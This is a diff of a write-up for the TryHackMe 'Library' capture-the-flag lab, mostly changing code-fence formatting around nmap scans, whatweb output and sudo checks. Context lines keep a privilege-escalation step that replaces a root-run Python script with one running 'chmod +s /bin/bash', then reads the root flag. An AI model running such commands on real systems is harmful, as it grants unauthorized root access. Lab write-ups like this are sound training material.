@@ -8,14 +8,14 @@ This Write-up/Walkthrough provides my process for the **Library** *(THM)* CTF. H
 
 Let's start with the scan:
 
-```bash
+```
 nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.112.179.188
 
   Discovered open port 22/tcp on 10.112.179.188
   Discovered open port 80/tcp on 10.112.179.188
+```
 
-###
-
+```
 nmap -p22,80 -sV -sC 10.112.179.188
 
   22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
@@ -40,7 +40,7 @@ I found 2 ports opened:
 
 ## Pasive Recognition
 
-```bash
+```
 whatweb 10.112.179.188
 
   ERROR Opening: https://10.112.179.188 - Connection refused - connect(2) for "10.112.179.188" port 443
@@ -96,7 +96,7 @@ I checked the `/var/www/html` and we do not have write permission, also I checke
 
 Let's check the sudo permissions
 
-```bash
+```
 sudo -l
 
 Matching Defaults entries for meliodas on ubuntu:
@@ -110,7 +110,7 @@ Given this, I wondered: "If root is owner and only root can write the file in OU
 
 And that was exactly what I did — that was the solution
 
-```bash
+```
 rm /home/meliodas/bak.py
 
 echo 'import os; os.system("chmod +s /bin/bash")' > /home/meliodas/bak.py
@@ -124,7 +124,7 @@ root
 ```
 Ecco! We are root, from here we can run:
 
-```bash
+```
 cat /root/root.txt
 ```
 
